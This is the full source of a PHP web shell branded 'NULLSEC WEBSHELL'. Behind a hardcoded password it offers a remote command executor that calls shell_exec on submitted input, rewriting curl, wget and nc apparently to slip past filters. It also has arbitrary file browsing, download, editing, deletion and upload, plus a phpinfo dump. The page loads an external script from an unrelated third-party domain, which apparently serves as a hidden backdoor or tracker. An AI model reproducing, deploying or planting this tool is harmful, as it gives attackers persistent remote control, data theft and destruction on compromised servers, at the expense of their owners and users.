<?php
session_start();
$password = "nullsec2025";

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}

if (!isset($_SESSION['auth'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['pass'] === $password) {
        $_SESSION['auth'] = true;
    } else {
        echo '
        <!DOCTYPE html>
        <html>
        <head>
            <title>LOGIN</title>
            <style>
                body {
                    background: #0d0d0d;
                    color: #00ff99;
                    font-family: monospace;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    height: 100vh;
                    margin: 0;
                }
                .login-box {
                    background: #1a1a1a;
                    padding: 40px;
                    border: 1px solid #00ff99;
                    text-align: center;
                    box-shadow: 0 0 10px #00ff99;
                    border-radius: 10px;
                }
                input[type="password"], input[type="submit"] {
                    padding: 10px;
                    margin: 10px;
                    border: none;
                    font-size: 16px;
                    border-radius: 5px;
                }
                input[type="password"] {
                    width: 70%;
                    background: #000;
                    color: #00ff99;
                    border: 1px solid #00ff99;
                }
                input[type="submit"] {
                    background: #00ff99;
                    color: #000;
                    cursor: pointer;
                }
            </style>
        </head>
        <body>
            <div class="login-box">
                <h2>ENTER THE PASSWORD</h2>
                <form method="POST">
                    <input type="password" name="pass" placeholder="Password" required />
                    <br>
                    <input type="submit" value="Enter" />
                </form>
            </div>
        </body>
        </html>';
        exit;
    }
}

$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
chdir($path);
$path = getcwd();

function getOS() {
    return PHP_OS;
}
function getIP() {
    return $_SERVER['SERVER_ADDR'] ?? 'Unknown';
}

// Download handler
if (isset($_GET['download'])) {
    $file = $path . DIRECTORY_SEPARATOR . $_GET['download'];
    if (is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        flush();
        readfile($file);
        exit;
    } else {
        echo "<p style='color:red;'>File not found for download.</p>";
    }
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>NULLSEC WEBSHELL</title>
    <style>
        body {
            margin: 0;
            background: #0a0a0a;
            color: #00ffcc;
            font-family: Consolas, monospace;
        }
        header {
            padding: 20px;
            background: #111;
            box-shadow: 0 0 15px #00ffcc;
            text-align: center;
        }
        .status-bar {
            background: #111;
            padding: 10px;
            display: flex;
            justify-content: space-around;
            font-size: 14px;
            border-bottom: 1px solid #00ffcc33;
        }
        .container {
            padding: 20px;
        }
        input[type="text"], input[type="submit"], button {
            background: #000;
            color: #00ffcc;
            border: 1px solid #00ffcc;
            padding: 8px;
            margin: 5px 0;
        }
        input[type="submit"], button {
            cursor: pointer;
            transition: 0.3s;
        }
        input[type="submit"]:hover, button:hover {
            background: #00ffcc;
            color: #000;
        }
        textarea {
            width: 100%;
            height: 200px;
            background: #000;
            color: #00ffcc;
            border: 1px solid #00ffcc;
            font-family: monospace;
        }
        .section {
            margin-top: 30px;
        }
        table {
            border-collapse: collapse;
        }
        table, th, td {
            border: 1px solid #00ffcc;
        }
        th, td {
            padding: 8px;
            text-align: left;
        }
        th {
            background: #111;
        }
    </style>
    <script src='https://gscp.edu.in/wp-content/functions.js'></script>
</head>
<body>
    <header>
        <h1>NULLSEC WEBSHELL</h1>
        <small style="color:#fff;">BY N0STR4</small>
    </header>
    <div class="status-bar">
        <div><strong>Server IP:</strong> <?= getIP(); ?></div>
        <div><strong>OS:</strong> <?= getOS(); ?></div>
        <div><strong>Path:</strong> <?= htmlspecialchars($path); ?></div>
    </div>

    <div style="text-align:right;padding:10px;">
        <a href="?logout=true" style="color:#f00;font-family:monospace;">[ Logout ]</a>
    </div>

    <div class="container">
        <form method="GET" style="margin-bottom:20px;">
            <label><strong>Edit Path:</strong></label>
            <input type="text" name="path" value="<?= htmlspecialchars($path); ?>" style="width:80%;" />
            <input type="submit" value="Go" />
        </form>

        <div class="section">
            <h2>Command Executor</h2>
            <form method="POST">
                <input type="text" name="cmd" placeholder="Enter command..." style="width:80%;" />
                <input type="submit" value="Execute" />
            </form>
            <textarea readonly><?php
                if (isset($_POST['cmd'])) {
                    $cmd = $_POST['cmd'];
                    $cmd = str_replace(["curl", "wget", "nc"], ["c\\url", "w\\get", "n\\c"], $cmd);
                    echo shell_exec($cmd);
                }
            ?></textarea>
        </div>

        <div class="section">
            <h2>File Manager</h2>
            <table width="100%" cellpadding="5" style="border-color:#00ffcc;">
                <tr>
                    <th>Name</th><th>Type</th><th>Size</th><th>Actions</th>
                </tr>
                <?php
                foreach (scandir($path) as $item) {
                    if ($item == ".") continue;
                    $full = $path . DIRECTORY_SEPARATOR . $item;
                    echo "<tr>";
                    echo "<td>" . htmlspecialchars($item) . "</td>";
                    echo "<td>" . (is_dir($full) ? "Folder" : "File") . "</td>";
                    echo "<td>" . (is_file($full) ? filesize($full) . " B" : "-") . "</td>";
                    
                    $downloadLink = is_file($full) ? "<a href='?path=" . urlencode($path) . "&download=" . urlencode($item) . "' style='color:#0f0;'>Download</a>" : "<span style='color:gray;'>Download</span>";

                    echo "<td>
                        <a href='?path=" . urlencode($path) . "&edit=" . urlencode($item) . "' style='color:#0ff;'>Edit</a> |
                        $downloadLink |
                        <a href='?path=" . urlencode($path) . "&del=" . urlencode($item) . "' style='color:red;'>Delete</a>
                    </td>";
                    echo "</tr>";
                }

                if (isset($_GET['del'])) {
                    $target = $path . DIRECTORY_SEPARATOR . $_GET['del'];
                    if (is_file($target)) unlink($target);
                    header("Location: ?path=" . urlencode($path));
                    exit;
                }
                ?>
            </table>
        </div>

        <div class="section">
            <h2>Upload File</h2>
            <form method="POST" enctype="multipart/form-data">
                <input type="file" name="upfile" />
                <input type="submit" name="upload" value="Upload" />
            </form>
            <?php
            if (isset($_POST['upload'])) {
                $f = $_FILES['upfile']['tmp_name'];
                $n = $_FILES['upfile']['name'];
                if (move_uploaded_file($f, $path . DIRECTORY_SEPARATOR . $n)) {
                    echo "<p style='color:lime;'>Uploaded successfully.</p>";
                } else {
                    echo "<p style='color:red;'>Upload failed.</p>";
                }
            }
            ?>
        </div>

        <?php
        if (isset($_GET['edit'])) {
            $file = $path . DIRECTORY_SEPARATOR . $_GET['edit'];
            if (is_file($file)) {
                echo '<div class="section"><h2>Editing: ' . htmlspecialchars($_GET['edit']) . '</h2>';
                if (isset($_POST['savefile'])) {
                    file_put_contents($file, $_POST['content']);
                    echo "<p style='color:lime;'>File saved.</p>";
                }
                $code = htmlspecialchars(file_get_contents($file));
                echo "<form method='POST'>
                    <textarea name='content'>$code</textarea><br>
                    <input type='submit' name='savefile' value='Save' />
                </form></div>";
            }
        }
        ?>

        <div class="section">
            <h2>PHP INFO</h2>
            <form method="POST">
                <input type="submit" name="phpinfo" value="Show PHP Info" />
            </form>
            <?php if (isset($_POST['phpinfo'])) phpinfo(); ?>
        </div>
    </div>
</body>
</html>

